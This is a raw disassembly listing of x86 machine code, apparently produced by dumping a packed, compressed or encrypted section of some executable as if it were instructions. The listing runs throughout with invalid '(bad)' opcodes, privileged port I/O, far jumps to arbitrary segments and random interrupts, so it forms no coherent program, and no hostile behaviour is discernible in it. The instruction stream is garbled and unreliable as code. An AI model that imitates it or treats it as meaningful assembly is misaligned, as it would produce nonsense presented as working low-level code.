  40e641:	fbstp  TBYTE PTR [esp+ecx*2-0x117c1587]
  40e648:	mov    BYTE PTR [eax-0x5c],dl
  40e64b:	push   esp
  40e64c:	lock mov ah,0x7d
  40e64f:	dec    esp
  40e650:	(bad)  
  40e651:	out    0x75,eax
  40e653:	mov    al,0xe8
  40e655:	jae    0x40e637
  40e657:	inc    edi
  40e658:	aam    0x90
  40e65a:	jge    0x40e627
  40e65c:	sets   BYTE PTR [edi+0x3c]
  40e660:	js     0x40e678
  40e662:	jl     0x40e63c
  40e664:	mul    cl
  40e666:	js     0x40e6b3
  40e668:	or     DWORD PTR [eax],0xffffffde
  40e66b:	add    eax,DWORD PTR [edx+0x16]
  40e66e:	pusha  
  40e66f:	jo     0x40e688
  40e671:	lahf   
  40e672:	xor    DWORD PTR [edi+0x60a65f9],edx
  40e678:	test   eax,0x4be6c93a
  40e67d:	push   ebp
  40e67e:	sub    BYTE PTR [ebx+0x4286aae2],bh
  40e684:	jns    0x40e698
  40e686:	scas   al,BYTE PTR es:[edi]
  40e687:	jmp    0x40e6dc
  40e689:	lea    edi,[ecx-0x14]
  40e68c:	in     eax,0x49
  40e68e:	mov    eax,ds:0x404a46d7
  40e693:	out    dx,al
  40e694:	lock arpl WORD PTR [esi],si
  40e697:	mov    ds:0x74882270,eax
  40e69c:	mov    dh,BYTE PTR [eax-0x7c]
  40e69f:	(bad)  
  40e6a0:	out    0xa8,eax
  40e6a2:	daa    
  40e6a3:	or     eax,0x69acb215
  40e6a8:	cmp    DWORD PTR [ebp-0x4c7f0edc],0x3d
  40e6af:	or     esi,DWORD PTR [ebp+0x5e]
  40e6b2:	push   0x22
  40e6b4:	push   ds
  40e6b5:	icebp  
  40e6b6:	cmp    al,0x6e
  40e6b8:	stos   BYTE PTR es:[edi],al
  40e6b9:	mov    ah,0x6c
  40e6bb:	(bad)  
  40e6bc:	mov    al,ds:0xb2e53453
  40e6c1:	mov    ebp,esp
  40e6c3:	lock push cs
  40e6c5:	pop    ss
  40e6c6:	leave  
  40e6c7:	(bad)  
  40e6c8:	xor    al,BYTE PTR [esi]
  40e6ca:	bound  esi,QWORD PTR [eax]
  40e6cc:	push   es
  40e6cd:	and    esp,DWORD PTR [eax-0x616d979d]
  40e6d3:	jnp    0x40e6ae
  40e6d5:	xchg   ecx,eax
  40e6d6:	mov    WORD PTR [edi],es
  40e6d8:	mov    ch,0x66
  40e6da:	retf   
  40e6db:	adc    eax,0xa3a370d7
  40e6e0:	pop    esi
  40e6e1:	and    DWORD PTR [edi+eiz*2],edx
  40e6e4:	loopne 0x40e714
  40e6e6:	out    0xdd,al
  40e6e8:	push   ecx
  40e6e9:	sar    eax,0xef
  40e6ec:	adc    ebx,ecx
  40e6ee:	xor    al,0x4a
  40e6f0:	xchg   edi,eax
  40e6f1:	mov    cl,0x86
  40e6f3:	enter  0x2ad5,0xdf
  40e6f7:	es add al,0x1d
  40e6fa:	neg    DWORD PTR [esi]
  40e6fc:	imul   esi,DWORD PTR [edi-0x2cf30d45],0xffffff82
  40e703:	clc    
  40e704:	or     BYTE PTR [ecx],cl
  40e706:	test   al,0x27
  40e708:	scas   al,BYTE PTR es:[edi]
  40e709:	scas   al,BYTE PTR es:[edi]
  40e70a:	pop    es
  40e70b:	ret    0x46ed
  40e70e:	push   cs
  40e70f:	dec    eax
  40e710:	xchg   ebp,eax
  40e711:	fldpi  
  40e713:	sub    edx,esp
  40e715:	push   edi
  40e716:	xchg   esi,eax
  40e717:	(bad)  
  40e718:	hlt    
  40e719:	xor    al,0x57
  40e71b:	lods   al,BYTE PTR ds:[esi]
  40e71c:	pop    edi
  40e71d:	mov    ebx,DWORD PTR [esi]
  40e71f:	lds    edx,FWORD PTR [ebx]
  40e721:	mov    bh,0x4d
  40e723:	pushf  
  40e724:	popf   
  40e725:	out    0xd4,al
  40e727:	enter  0x347,0xa4
  40e72b:	mov    cl,BYTE PTR [esi]
  40e72d:	push   0xb96245f3
  40e732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e733:	bound  esi,QWORD PTR [ebx]
  40e735:	mov    dl,0x59
  40e737:	pop    esp
  40e738:	int    0x60
  40e73a:	scas   eax,DWORD PTR es:[edi]
  40e73b:	sub    BYTE PTR [edi-0x2a5d667d],cl
  40e741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e742:	loop   0x40e77d
  40e744:	repnz push edx
  40e746:	push   es
  40e747:	js     0x40e6d2
  40e749:	mov    eax,ds:0xb268c002
  40e74e:	adc    BYTE PTR [edx-0x78c01d8e],bl
  40e754:	mov    ds:0xab6d6ae3,al
  40e759:	or     al,0xa
  40e75b:	mov    cx,0xb76b
  40e75f:	dec    ebx
  40e760:	daa    
  40e761:	out    0x47,al
  40e763:	(bad)  
  40e764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e765:	add    eax,edx
  40e767:	cmc    
  40e768:	sbb    dl,0x19
  40e76b:	jl     0x40e72d
  40e76d:	data16 jge 0x40e796
  40e770:	add    eax,0x96a1e4bc
  40e775:	lods   al,BYTE PTR ds:[esi]
  40e776:	hlt    
  40e777:	mov    esi,DWORD PTR ds:0xfe1f1119
  40e77d:	inc    ebx
  40e77e:	push   ds
  40e77f:	lahf   
  40e780:	repnz mov dh,0x52
  40e783:	mov    bh,0x1
  40e785:	mov    cl,0x33
  40e787:	xchg   ebx,eax
  40e788:	lea    esi,[edx+0x75]
  40e78b:	xchg   ebp,eax
  40e78c:	ins    BYTE PTR es:[edi],dx
  40e78d:	xor    ah,0x83
  40e790:	jne    0x40e779
  40e792:	icebp  
  40e793:	sub    eax,0x4290b6b3
  40e798:	mov    sp,0xeac7
  40e79c:	push   edx
  40e79d:	std    
  40e79e:	pop    eax
  40e79f:	jae    0x40e75d
  40e7a1:	push   edi
  40e7a2:	ins    DWORD PTR es:[edi],dx
  40e7a3:	es xor ch,ch
  40e7a6:	or     DWORD PTR [ecx-0x7c9993a],ebx
  40e7ac:	inc    eax
  40e7ad:	mov    dh,0x15
  40e7af:	jb     0x40e7e4
  40e7b1:	mov    dh,0xda
  40e7b3:	and    DWORD PTR [esi],edx
  40e7b5:	ss xor ecx,esi
  40e7b8:	mov    es,WORD PTR [eax]
  40e7ba:	fdivr  st(3),st
  40e7bc:	push   ds
  40e7bd:	inc    esi
  40e7be:	pop    ds
  40e7bf:	add    cl,dl
  40e7c1:	inc    esp
  40e7c2:	and    DWORD PTR [esp+edi*8-0x60dc0dca],edx
  40e7c9:	push   cs
  40e7ca:	sub    edx,DWORD PTR [esi+0x69b72049]
  40e7d0:	and    al,0x7b
  40e7d2:	shr    BYTE PTR [eax+edx*1],0xc9
  40e7d6:	sti    
  40e7d7:	outs   dx,BYTE PTR ds:[esi]
  40e7d8:	xor    esp,DWORD PTR [esi-0x11]
  40e7db:	mov    ecx,0xe4df5160
  40e7e0:	imul   eax,eax,0xec090acf
  40e7e6:	sub    eax,DWORD PTR [esi]
  40e7e8:	es daa 
  40e7ea:	test   BYTE PTR [ebp+esi*8-0x8],ch
  40e7ee:	mov    BYTE PTR [edx+0x763536e5],bl
  40e7f4:	scas   al,BYTE PTR es:[edi]
  40e7f5:	pop    ss
  40e7f6:	push   es
  40e7f7:	outs   dx,BYTE PTR ds:[esi]
  40e7f8:	jg     0x40e86d
  40e7fa:	inc    edx
  40e7fb:	or     BYTE PTR [edx+0x64],0x87
  40e7ff:	outs   dx,BYTE PTR ds:[esi]
  40e800:	ja     0x40e805
  40e802:	adc    ecx,ebp
  40e804:	add    DWORD PTR [esi],eax
  40e806:	xchg   edi,eax
  40e807:	addr16 je 0x40e7eb
  40e80a:	outs   dx,DWORD PTR ds:[esi]
  40e80b:	dec    ebp
  40e80c:	jne    0x40e888
  40e80e:	xor    edx,DWORD PTR [ecx-0x7d87e8fb]
  40e814:	dec    ecx
  40e815:	pop    eax
  40e816:	cs (bad) 
  40e819:	lea    ebp,[eax]
  40e81b:	xchg   ebp,eax
  40e81c:	xchg   cl,dl
  40e81e:	into   
  40e81f:	jp     0x40e7a5
  40e821:	and    ecx,DWORD PTR [esi*8-0x70f31afd]
  40e828:	jo     0x40e851
  40e82a:	je     0x40e850
  40e82c:	in     al,dx
  40e82d:	mov    al,ds:0x1fb810d2
  40e832:	sar    DWORD PTR gs:[ecx+edx*4-0x6ba47725],0xfe
  40e83b:	or     ebx,DWORD PTR [edx-0x2e]
  40e83e:	fild   WORD PTR [edi]
  40e840:	lds    ebp,FWORD PTR [ecx+0x6b]
  40e843:	jb     0x40e7e4
  40e845:	pop    esi
  40e846:	mov    dh,0x92
  40e848:	sbb    al,BYTE PTR [ecx]
  40e84a:	add    DWORD PTR [esi],edi
  40e84c:	icebp  
  40e84d:	push   ecx
  40e84e:	shl    ebx,0x93
  40e851:	cdq    
  40e852:	sub    eax,0x85759fab
  40e857:	cld    
  40e858:	jbe    0x40e80a
  40e85a:	jno    0x40e86d
  40e85c:	sbb    eax,DWORD PTR [ecx+0x40b166d2]
  40e862:	inc    ebx
  40e863:	fsubp  st(7),st
  40e865:	dec    eax
  40e866:	add    esp,DWORD PTR [ebp-0x3b0fc203]
  40e86c:	daa    
  40e86d:	call   0xa1a0:0x440cb5ba
  40e874:	lea    esi,[ebx-0x39]
  40e877:	add    ebx,esp
  40e879:	popf   
  40e87a:	mov    edx,0x9eb40c9
  40e87f:	fs xor edx,edx
  40e882:	mov    esp,0x5c2860bd
  40e887:	mov    eax,ds:0x47bb8ca3
  40e88c:	ins    BYTE PTR es:[edi],dx
  40e88d:	retf   
  40e88e:	nop
  40e88f:	dec    eax
  40e890:	mov    al,BYTE PTR [edi+eax*1]
  40e893:	loopne 0x40e8a3
  40e895:	mov    DWORD PTR [esi+0x521578c3],ebp
  40e89b:	cmp    DWORD PTR [eax+eiz*2],ecx
  40e89e:	int3   
  40e89f:	sub    BYTE PTR [ebx+0x236f9ebe],dh
  40e8a5:	pop    es
  40e8a6:	aad    0xd5
  40e8a8:	ja     0x40e886
  40e8aa:	add    eax,0x4790e148
  40e8af:	aad    0x62
  40e8b1:	mov    esp,0x6eee0201
  40e8b6:	xchg   ebx,eax
  40e8b7:	ja     0x40e83f
  40e8b9:	xlat   BYTE PTR ds:[ebx]
  40e8ba:	pushf  
  40e8bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8bc:	popf   
  40e8bd:	addr16 mov ds:0x7aff,eax
  40e8c1:	sub    BYTE PTR [ebx+edi*2-0x1a],bh
  40e8c5:	and    ecx,DWORD PTR [edi]
  40e8c7:	(bad)  
  40e8c8:	es shl ebp,0x65
  40e8cc:	jnp    0x40e8b0
  40e8ce:	cmp    esp,DWORD PTR [eax-0x6f]
  40e8d1:	ins    DWORD PTR es:[edi],dx
  40e8d2:	dec    ebx
  40e8d3:	loope  0x40e93c
  40e8d5:	test   eax,0x26bb29a3
  40e8da:	inc    ebx
  40e8db:	inc    ebp
  40e8dc:	sbb    eax,0xa44d8b86
  40e8e1:	aad    0xfa
  40e8e3:	pop    esp
  40e8e4:	xchg   esp,eax
  40e8e5:	jmp    0x42b7:0x59eba17c
  40e8ec:	loop   0x40e8ca
  40e8ee:	ja     0x40e88b
  40e8f0:	and    eax,0xde625e08
  40e8f5:	int    0x30
  40e8f7:	adc    eax,0xbc0de1e6
  40e8fc:	mov    ah,0x8e
  40e8fe:	push   eax
  40e8ff:	inc    esi
  40e900:	jle    0x40e930
  40e902:	xor    BYTE PTR [ecx],0xb
  40e905:	pop    es
  40e906:	fadd   DWORD PTR [edi-0x48363415]
  40e90c:	iret   
  40e90d:	ret    
  40e90e:	lock lahf 
  40e910:	into   
  40e911:	jbe    0x40e970
  40e913:	add    bl,BYTE PTR [ecx+0x12]
  40e916:	mov    esp,0xf8c9813
  40e91b:	ffree  st(4)
  40e91d:	pop    eax
  40e91e:	call   0xf55e1a68
  40e923:	sbb    eax,0xf0889cd3
  40e928:	push   ss
  40e929:	ins    DWORD PTR es:[edi],dx
  40e92a:	cli    
  40e92b:	pop    ds
  40e92c:	jo     0x40e986
  40e92e:	fcom   QWORD PTR [esi-0x70]
  40e931:	das    
  40e932:	cmc    
  40e933:	mov    BYTE PTR [eax],bl
  40e935:	aaa    
  40e936:	jmp    0xd175:0xa9c73a4f
  40e93d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e93e:	mov    WORD PTR [ecx],ss
  40e940:	pop    edx
  40e941:	out    dx,eax
  40e942:	imul   edi,DWORD PTR [edi],0xffffffa7
  40e945:	sahf   
  40e946:	jmp    0x40e964
  40e948:	mov    edi,0x8aa173a0
  40e94d:	pop    DWORD PTR [edi+0x4d]
  40e950:	jnp    0x40e8d8
  40e952:	jp     0x40e910
  40e954:	scas   al,BYTE PTR es:[edi]
  40e955:	xchg   esi,eax
  40e956:	fdivr  st,st(2)
  40e958:	fbld   TBYTE PTR [ecx-0x5152e9a8]
  40e95e:	bswap  ebp
  40e960:	mov    dl,0x8
  40e962:	inc    edi
  40e963:	ror    DWORD PTR [ebx],cl
  40e965:	(bad)  [esp+ebx*1]
  40e968:	loop   0x40e994
  40e96a:	ror    DWORD PTR [ebx-0x31],cl
  40e96d:	push   esi
  40e96e:	or     DWORD PTR ds:0xd1ea6fb4,edi
  40e974:	jp     0x40e9e5
  40e976:	mov    edx,0xfa54aa4a
  40e97b:	stc    
  40e97c:	jno    0x40e9c9
  40e97e:	xor    eax,0x5f5264d6
  40e983:	jb     0x40e928
  40e985:	sub    edx,0x5d
  40e988:	pop    esi
  40e989:	mov    bl,dl
  40e98b:	call   0xa8d6a244
  40e990:	adc    eax,0x52c95611
  40e995:	jo     0x40e9d4
  40e997:	jns    0x40e979
  40e999:	popf   
  40e99a:	xor    ebp,esp
  40e99c:	test   DWORD PTR [edi+0x2c],ebp
  40e99f:	jge    0x40e9d5
  40e9a1:	call   0x9bfa:0xf5cf7251
  40e9a8:	js     0x40ea1f
  40e9aa:	inc    edx
  40e9ab:	mov    dl,0x63
  40e9ad:	ins    DWORD PTR es:[edi],dx
  40e9ae:	jg     0x40ea12
  40e9b0:	mov    ds:0x393fa574,al
  40e9b5:	retf   0x1d95
  40e9b8:	pop    esi
  40e9b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9ba:	(bad)  
  40e9bb:	out    dx,al
  40e9bc:	pusha  
  40e9bd:	(bad)
  40e9c1:	data16 add bl,BYTE PTR [bx]
  40e9c5:	call   0x95a531a7
  40e9ca:	pop    esp
  40e9cb:	jns    0x40ea10
  40e9cd:	pop    eax
  40e9ce:	test   DWORD PTR [esi-0x7a223ab8],ebx
  40e9d4:	fadd   DWORD PTR [esi]
  40e9d6:	dec    ebx
  40e9d7:	mov    bl,0x9c
  40e9d9:	out    dx,eax
  40e9da:	inc    eax
  40e9db:	popa   
  40e9dc:	xor    bh,BYTE PTR [ebx+0x1e]
  40e9df:	adc    al,0x4a
  40e9e1:	in     al,0xbc
  40e9e3:	mov    BYTE PTR [ecx+0x68],al
  40e9e6:	into   
  40e9e7:	push   esp
  40e9e8:	mov    bh,0x1e
  40e9ea:	out    dx,al
  40e9eb:	sbb    al,0x8c
  40e9ed:	inc    esp
  40e9ee:	rol    DWORD PTR [edx+0x6e87d6c2],cl
  40e9f4:	clc    
  40e9f5:	mov    ebp,0xe4972162
  40e9fa:	cmp    ebp,ecx
  40e9fc:	aas    
  40e9fd:	fucom  st(2)
  40e9ff:	xchg   esp,eax
  40ea00:	push   ecx
  40ea01:	das    
  40ea02:	rcr    esp,1
  40ea04:	test   eax,0x41b6ad55
  40ea09:	mov    dh,0xfd
  40ea0b:	cs std 
  40ea0d:	rol    bl,1
  40ea0f:	fsub   DWORD PTR [edx+0x1b38def6]
  40ea15:	push   esp
  40ea16:	aad    0xe3
  40ea18:	and    eax,eax
  40ea1a:	mov    eax,0x88fc310d
  40ea1f:	pop    edx
  40ea20:	pop    es
  40ea21:	jg     0x40ea75
  40ea23:	xor    eax,0x88db2fed
  40ea28:	sar    DWORD PTR [esi-0x22f402a6],cl
  40ea2e:	sahf   
  40ea2f:	dec    ecx
  40ea30:	add    cl,cl
  40ea32:	dec    edx
  40ea33:	mov    ds,esp
  40ea35:	fcom   QWORD PTR [ecx-0x2b]
  40ea38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea39:	ss jg  0x40ea70
  40ea3c:	pop    es
  40ea3d:	jmp    DWORD PTR [edi+0x31855c59]
  40ea43:	mov    al,ds:0x3d347f6f
  40ea48:	sub    al,0xa7
  40ea4a:	fistp  DWORD PTR [esi+0x65]
  40ea4d:	out    0x8c,eax
  40ea4f:	neg    BYTE PTR [ebx]
  40ea51:	mov    ds:0xc738a456,al
  40ea56:	dec    eax
  40ea57:	push   eax
  40ea58:	xor    BYTE PTR [ebx-0x7],ah
  40ea5b:	mov    edx,0x4375a1c4
  40ea60:	mov    dh,BYTE PTR [eax+0x2020f04c]
  40ea66:	rcl    edx,cl
  40ea68:	in     eax,dx
  40ea69:	fwait
  40ea6a:	pop    edx
  40ea6b:	aam    0x3
  40ea6d:	jne    0x40ea5e
  40ea6f:	or     DWORD PTR [ebp+0xa98b26d],eax
  40ea75:	or     DWORD PTR [ecx+0x16b9934],edx
  40ea7b:	jl     0x40ea4b
  40ea7d:	xchg   ebx,eax
  40ea7e:	aas    
  40ea7f:	mov    eax,0x7592a568
  40ea84:	sbb    DWORD PTR ds:0xc0fd2bf1,ebp
  40ea8a:	push   esi
  40ea8b:	lea    esp,[esi+0x5a661635]
  40ea91:	in     al,dx
  40ea92:	fild   WORD PTR [ebx]
  40ea94:	sub    al,BYTE PTR [ecx-0x3e]
  40ea97:	cwde   
  40ea98:	test   DWORD PTR [edi],ebp
  40ea9a:	xchg   edi,eax
  40ea9b:	les    esp,FWORD PTR [esi]
  40ea9d:	lea    esp,[edx]
  40ea9f:	les    ebx,FWORD PTR [esi]
  40eaa1:	stos   BYTE PTR es:[edi],al
  40eaa2:	pop    esi
  40eaa3:	mov    ecx,edi
  40eaa5:	sahf   
  40eaa6:	add    BYTE PTR [edx+0x14595d0b],0xf
  40eaad:	je     0x40ea6e
  40eaaf:	jne    0x40ea3a
  40eab1:	sbb    al,0x9d
  40eab3:	mov    ds:0xeb080aa2,eax
  40eab9:	aad    0x91
  40eabb:	fwait
  40eabc:	lods   eax,DWORD PTR ds:[esi]
  40eabd:	cdq    
  40eabe:	pop    ebp
  40eabf:	and    ch,ch
  40eac1:	push   0x55
  40eac3:	push   ss
  40eac4:	call   0x5a1a1f6a
  40eac9:	enter  0x741d,0xe8
  40eacd:	mov    edi,0x501fbc39
  40ead2:	ret    
  40ead3:	dec    ecx
  40ead4:	ret    
  40ead5:	mov    al,BYTE PTR [ecx]
  40ead7:	int3   
  40ead8:	pop    edi
  40ead9:	test   eax,0x975aeaf5
  40eade:	sub    BYTE PTR [edi+0xbadea2e],ah
  40eae4:	pop    ds
  40eae5:	mov    edx,ebx
  40eae7:	shr    BYTE PTR ds:0x31786204,cl
  40eaed:	push   edx
  40eaee:	aad    0x74
  40eaf0:	mov    al,0x55
  40eaf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaf3:	outs   dx,DWORD PTR ds:[esi]
  40eaf4:	aam    0x3c
  40eaf6:	in     eax,dx
  40eaf7:	ret    
  40eaf8:	adc    DWORD PTR [edx],ebp
  40eafa:	sub    BYTE PTR [edx],cl
  40eafc:	dec    edi
  40eafd:	mov    ah,dl
  40eaff:	iret   
  40eb00:	loop   0x40eada
  40eb02:	int    0xc6
  40eb04:	inc    esp
  40eb05:	xchg   esi,eax
  40eb06:	inc    esp
  40eb07:	sbb    DWORD PTR [esi+0x2d795e57],0x5797c938
  40eb11:	out    dx,eax
  40eb12:	and    al,BYTE PTR fs:[ebp+ebp*1-0x4b]
  40eb17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb18:	inc    edi
  40eb19:	xchg   ebp,eax
  40eb1a:	sbb    BYTE PTR [ecx],0xbe
  40eb1d:	das    
  40eb1e:	popf   
  40eb1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb20:	jne    0x40eb50
  40eb22:	fdivr  DWORD PTR [ecx]
  40eb24:	pop    esi
  40eb25:	push   0x7e
  40eb27:	lahf   
  40eb28:	jb     0x40eb09
  40eb2a:	scas   eax,DWORD PTR es:[edi]
  40eb2b:	mov    ds:0x5bb1da2e,eax
  40eb30:	mov    esp,0xacfd4894
  40eb35:	ds ss mov edx,0x80c508b3
  40eb3c:	fs int 0x23
  40eb3f:	es push edx
  40eb41:	iret   
  40eb42:	push   ds
  40eb43:	std    
  40eb44:	cmp    DWORD PTR [edi-0x27],0xbba929d7
  40eb4b:	add    BYTE PTR [ebx-0x2992b065],ah
  40eb51:	inc    edi
  40eb52:	rol    edx,1
  40eb54:	jecxz  0x40ebbe
  40eb56:	int    0x8b
  40eb58:	mov    dh,0x9e
  40eb5a:	xor    BYTE PTR [ebx],0xea
  40eb5d:	sbb    DWORD PTR [edx-0x728455b6],0xd8ee4c48
  40eb67:	lods   al,BYTE PTR ds:[esi]
  40eb68:	ret    0xd77
  40eb6b:	ret    
  40eb6c:	jbe    0x40ebb8
  40eb6e:	das    
  40eb6f:	sub    dh,al
  40eb71:	test   BYTE PTR [ecx],0x62
  40eb74:	aad    0x7c
  40eb76:	lods   eax,DWORD PTR ds:[esi]
  40eb77:	stos   DWORD PTR es:[edi],eax
  40eb78:	leave  
  40eb79:	jl     0x40eb7c
  40eb7b:	ins    BYTE PTR es:[edi],dx
  40eb7c:	imul   esp,DWORD PTR [edi+0x8],0xafa3ba4e
  40eb83:	mov    ebp,0xc1d81bcc
  40eb88:	stos   BYTE PTR es:[edi],al
  40eb89:	popf   
  40eb8a:	shl    DWORD PTR [ebp-0x7aeb2b6a],0x5b
  40eb91:	clc    
  40eb92:	push   edx
  40eb93:	sbb    al,0x38
  40eb95:	jg     0x40eb24
  40eb97:	stos   BYTE PTR es:[edi],al
  40eb98:	jb     0x40ebdc
  40eb9a:	inc    ebp
  40eb9b:	stc    
  40eb9c:	pop    esp
  40eb9d:	dec    BYTE PTR [eax-0x30cb6d07]
  40eba3:	jp     0x40ec06
  40eba5:	adc    al,0xc4
  40eba7:	xchg   ebx,eax
  40eba8:	mov    ds:0x74532640,al
  40ebad:	xchg   esi,eax
  40ebae:	add    al,0x49
  40ebb0:	inc    ebp
  40ebb1:	ja     0x40ec00
  40ebb3:	and    edi,DWORD PTR [eax+edi*4]
  40ebb6:	or     bl,cl
  40ebb8:	cmp    al,bl
  40ebba:	pop    ds
  40ebbb:	fidiv  WORD PTR [ebx+0x4e]
  40ebbe:	inc    esi
  40ebbf:	daa    
  40ebc0:	cmp    edx,DWORD PTR [esi-0x3a21208d]
  40ebc6:	mov    ah,0x22
  40ebc8:	sub    al,0xc6
  40ebca:	push   cs
  40ebcb:	inc    edx
  40ebcc:	fmul   QWORD PTR [edi+esi*8+0x75]
  40ebd0:	sar    bh,1
  40ebd2:	hlt    
  40ebd3:	icebp  
  40ebd4:	in     eax,dx
  40ebd5:	in     al,dx
  40ebd6:	mov    fs,edx
  40ebd8:	jl     0x40ec24
  40ebda:	(bad)  
  40ebdb:	lea    ebp,[ecx]
  40ebdd:	xor    dh,BYTE PTR [edx-0xf]
  40ebe0:	mov    BYTE PTR [ebx-0x46],ah
  40ebe3:	out    dx,al
  40ebe4:	inc    edi
  40ebe5:	xchg   edx,eax
  40ebe6:	jmp    0x367359f9
  40ebeb:	dec    eax
  40ebec:	pop    edi
  40ebed:	fbld   TBYTE PTR es:[ecx]
  40ebf0:	test   bl,bh
  40ebf2:	inc    edx
  40ebf3:	mov    esp,0x4e25d087
  40ebf8:	inc    ebp
  40ebf9:	or     DWORD PTR [esi],esi
  40ebfb:	repnz adc BYTE PTR [ebp-0x20],cl
  40ebff:	dec    esi
  40ec00:	mov    cs,WORD PTR ds:0xb7adfc6e
  40ec06:	mov    BYTE PTR [ebx],cl
  40ec08:	popa   
  40ec09:	in     al,0xe7
  40ec0b:	ror    DWORD PTR [ecx+0x6d913a3f],0x5b
  40ec12:	aam    0x65
  40ec14:	or     al,0xa5
  40ec16:	adc    eax,ecx
  40ec18:	retf   
  40ec19:	push   ds
  40ec1a:	mov    ah,BYTE PTR [esi+edi*8+0x32]
  40ec1e:	es cs and edx,edi
  40ec22:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40ec24:	rcr    edx,0xbd
  40ec27:	sub    DWORD PTR [ebp-0x325bb398],0x31
  40ec2e:	sbb    eax,DWORD PTR [eax+ebx*2+0x14]
  40ec32:	jecxz  0x40ec30
  40ec34:	adc    esi,DWORD PTR [esi+0x49ed1ba1]
  40ec3a:	outs   dx,DWORD PTR ds:[esi]
  40ec3b:	bound  edx,QWORD PTR [ebx]
  40ec3d:	cli    
  40ec3e:	(bad)  
  40ec3f:	mov    edi,0xad684117
  40ec44:	push   edi
  40ec45:	call   0x42c465b6
  40ec4a:	pop    esp
  40ec4b:	inc    eax
  40ec4c:	js     0x40ec8e
  40ec4e:	jbe    0x40ec6c
  40ec50:	das    
  40ec51:	mov    WORD PTR [ecx+eiz*1+0x19111a6b],gs
  40ec58:	mov    ecx,0x14c28a77
  40ec5d:	push   0xd0397d55
  40ec62:	jl     0x40ecab
  40ec64:	sub    BYTE PTR [ebx-0x49ca0d14],dh
  40ec6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec6b:	(bad)  
  40ec6c:	lods   al,BYTE PTR ds:[esi]
  40ec6d:	leave  
  40ec6e:	jnp    0x40ec13
  40ec70:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec72:	jb     0x40ece2
  40ec74:	das    
  40ec75:	retf   0x44f3
  40ec78:	cmc    
  40ec79:	pop    ebx
  40ec7a:	mov    al,0xc
  40ec7c:	adc    edx,DWORD PTR [esi+0x64b01729]
  40ec82:	fnsave ds:0x208a1e7a
  40ec88:	mov    edi,0x3a2c309c
  40ec8d:	add    bl,BYTE PTR [ebp-0x477b8a4b]
  40ec93:	ins    BYTE PTR es:[edi],dx
  40ec94:	sub    al,0xb5
  40ec96:	call   0x40ecef
	...
  40ed13:	add    BYTE PTR [edx-0x11c51bc],dl
  40ed19:	jmp    0x40ecfa
  40ed1b:	jne    0x40ed80
  40ed1d:	pop    ecx
  40ed1e:	jmp    0x21d9:0x67fed41d
  40ed25:	call   0x0:0x76c0000
  40ed2c:	repnz mov edx,0x2504e419
  40ed32:	inc    ecx
  40ed33:	ds (bad) 
  40ed36:	push   ebx
  40ed37:	pop    es
  40ed38:	repz fs pop ds
  40ed3b:	xor    DWORD PTR [edx-0x1fb89b49],ebp
  40ed41:	cwde   
  40ed42:	mov    ebx,0xd1ef2a11
  40ed47:	jbe    0x40ed9f
  40ed49:	ret    
  40ed4a:	dec    eax
  40ed4b:	sub    ebx,ebp
  40ed4d:	mov    esi,0xaba90b03
  40ed52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed53:	pop    ebx
  40ed54:	test   al,0xdf
  40ed56:	inc    esi
  40ed57:	mov    edi,0xd42fa9d3
  40ed5c:	int3   
  40ed5d:	inc    ecx
  40ed5e:	xchg   edx,eax
  40ed5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed60:	pop    edx
  40ed61:	sti    
  40ed62:	pop    ebx
  40ed63:	push   0x58cbfd83
  40ed68:	xlat   BYTE PTR ds:[ebx]
  40ed69:	dec    ecx
  40ed6a:	inc    ebx
  40ed6b:	pop    ebp
  40ed6c:	in     al,dx
  40ed6d:	sbb    al,0x6
  40ed6f:	push   ss
  40ed70:	int    0x51
  40ed72:	sub    DWORD PTR [ecx],eax
  40ed74:	into   
  40ed75:	and    DWORD PTR [ebp-0x5c],edi
  40ed78:	inc    eax
  40ed79:	sbb    ecx,DWORD PTR [eax-0x628450a9]
  40ed7f:	(bad)  
  40ed80:	mov    ds:0x1be0029d,al
  40ed85:	mov    DWORD PTR [edi-0x1c402ddf],ebp
  40ed8b:	cmp    dl,ch
  40ed8d:	rol    BYTE PTR [ebx+0x2e],0xcc
  40ed91:	xor    ebx,ecx
  40ed93:	mov    al,ds:0x2edee1ac
  40ed98:	mov    bh,0xce
  40ed9a:	and    cl,BYTE PTR [ecx+0x490407db]
  40eda0:	mov    edi,0xd163c9bd
  40eda5:	jmp    0x4f4b0be1
  40edaa:	push   edx
  40edab:	mov    cl,0x2
  40edad:	and    al,BYTE PTR [esi-0x1a]
  40edb0:	sub    eax,0xc6d66edd
  40edb5:	out    0x7d,eax
  40edb7:	and    DWORD PTR [ebp-0x1],eax
  40edba:	stos   BYTE PTR es:[edi],al
  40edbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edbc:	jo     0x40edbe
  40edbe:	or     ch,BYTE PTR [ebx+0x16aee4fa]
  40edc4:	mov    eax,0x81da42a4
  40edc9:	pop    eax
  40edca:	inc    ebp
  40edcb:	sub    esi,ebx
  40edcd:	jae    0x40edc5
  40edcf:	shr    DWORD PTR [ecx+0x4e],1
  40edd2:	aad    0x15
  40edd4:	sbb    DWORD PTR [edi],esp
  40edd6:	and    al,0x30
  40edd8:	dec    eax
  40edd9:	or     eax,0x41dd1ba7
  40edde:	jnp    0x40ed77
  40ede0:	aad    0xda
  40ede2:	loop   0x40edef
  40ede4:	test   BYTE PTR [ebp-0x31f1b89b],bl
  40edea:	rcr    BYTE PTR [edi+0x3def0207],1
  40edf0:	mov    ecx,0x92b7ba35
  40edf5:	jp     0x40ed9d
  40edf7:	out    dx,al
  40edf8:	mov    ah,cl
  40edfa:	fs xchg edx,eax
  40edfc:	repz inc ecx
